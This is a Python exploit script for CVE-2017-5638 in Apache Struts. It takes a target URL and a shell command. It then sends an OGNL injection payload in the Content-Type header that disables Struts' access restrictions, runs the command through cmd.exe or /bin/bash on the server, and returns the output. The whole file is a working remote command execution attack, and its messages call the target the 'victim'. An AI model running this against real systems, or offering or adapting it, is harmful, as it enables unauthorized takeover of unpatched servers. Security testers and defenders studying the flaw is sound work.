import argparse
import requests
import sys
from log_colors import *
requests.packages.urllib3.disable_warnings()

# CVE-2017-5638
# 
class CVE2017_5638:
    headers = {"User-Agent" : "Mozilla/5.0"}

    def __init__(self, url, cmd):
        print (LogColors.BLUE + "victim: " + url  + "..." + LogColors.ENDC)
        self.url = url.rstrip("/")
        self.cmd = cmd
        self.session = requests.Session()

    # generate payload
    def generate_payload(self):
        print (LogColors.BLUE + "generate payload..." + LogColors.ENDC)
        payload = "%{(#_='multipart/form-data')."
        payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        payload += "(#_memberAccess?"
        payload += "(#_memberAccess=#dm):"
        payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        payload += "(#ognlUtil.getExcludedPackageNames().clear())."
        payload += "(#ognlUtil.getExcludedClasses().clear())."
        payload += "(#context.setMemberAccess(#dm))))."
        payload += "(#cmd='%s')." % self.cmd
        payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
        payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
        payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
        payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
        payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
        payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
        payload += "(#ros.flush())}"
        self.payload = payload
        print (LogColors.YELLOW + "successfully generate payload..." + LogColors.ENDC)

    # exploitation
    def exploit(self):
        self.generate_payload()
        print (LogColors.BLUE + "send payload with cmd..." + LogColors.ENDC)
        try:
            headers =  {"User-Agent" : "Mozilla/5.0", "Content-Type" : self.payload}
            r = self.session.get(self.url, headers = headers, timeout = 7,
                verify = False, allow_redirects = False)
            result = r.text
        except requests.exceptions.ChunkedEncodingError:
            print (LogColors.YELLOW + "chunked encoding error..." + LogColors.ENDC)
            print (LogColors.YELLOW + "another request..." + LogColors.ENDC)
            try:
                result = b""
                with self.session.get(self.url, headers = headers, allow_redirects = False, verify = False, stream = True, timeout = 7) as r:
                    for chunk in r.iter_content():
                        result += chunk
            except requests.exceptions.ChunkedEncodingError as e:
                print (LogColors.RED + "server connection closed. :(" + LogColors.ENDC)
                #print (LogColors.RED + str(e) + LogColors.ENDC)
            except Exception as e:
                result = "errorrrrr. kittens wanna cry :("
            if type(result) != str:
                result = result.decode('utf-8')
            return result
        except Exception as e:
            result = "errorrrrr. kittens wanna cry :("
            print (LogColors.RED + str(e) + LogColors.ENDC)
        return result

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "target url")
    parser.add_argument('-c','--cmd', required = True, help = "command for exploitation")
    args = vars(parser.parse_args())
    url, cmd = args['url'], args['cmd']
    cve = CVE2017_5638(url, cmd)
    print (cve.exploit())

